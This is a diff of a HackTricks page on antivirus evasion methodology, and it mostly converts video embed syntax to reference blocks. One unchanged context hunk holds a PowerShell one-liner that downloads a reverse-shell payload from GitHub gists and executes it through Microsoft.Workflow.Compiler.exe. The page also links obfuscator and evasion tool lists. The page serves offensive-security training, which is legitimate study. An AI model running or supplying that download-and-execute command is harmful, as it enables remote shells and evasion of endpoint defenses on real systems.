@@ -2,7 +2,6 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-
 **This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
 ## **AV Evasion Methodology**
@@ -313,11 +312,15 @@ Every environment you go against will have their own strengths and weaknesses.
 
 I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.
 
-{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
+{{#ref}}
+https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
+{{#endref}}
 
 his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.
 
-{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
+{{#ref}}
+https://www.youtube.com/watch?v=IbA7Ung39o4
+{{#endref}}
 
 ## **Old Techniques**
 
@@ -512,7 +515,9 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
 
-{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
+{{#ref}}
+https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
+{{#endref}}
 
 C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
@@ -566,8 +571,4 @@ https://github.com/praetorian-code/vulcan
 
 - [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-
 {{#include ../banners/hacktricks-training.md}}
-
-
-
